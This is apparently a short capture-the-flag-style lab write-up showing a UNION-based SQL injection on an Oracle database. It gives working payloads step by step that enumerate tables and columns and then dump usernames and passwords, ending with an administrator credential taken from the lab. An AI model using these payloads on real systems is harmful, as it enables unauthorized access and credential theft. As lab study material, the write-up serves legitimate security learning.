# Lab: SQL injection attack, listing the database contents on Oracle

Determine number of columns: `'UNION+SELECT+NULL,NULL+FROM+all_tables--`

Get the tables in the DB with `''UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--`

Searching for "users" in the returned data, "USERS_WWGNIL" looks like a good candidate for holding usernames/passwords.

Try finding the columns in the table: `'UNION+SELECT+NULL,COLUMN_NAME+FROM+all_tab_columns+WHERE+table_name='USERS_WWGNIL'--`

This returns:
```
PASSWORD_RTLRHZ
USERNAME_CKNTHQ
```

Query the columns: `'UNION+SELECT+USERNAME_CKNTHQ,PASSWORD_RTLRHZ+FROM+USERS_WWGNIL--`

Login with the returned creds:
```
administrator
on42mldc6o0tk3w7ri75
```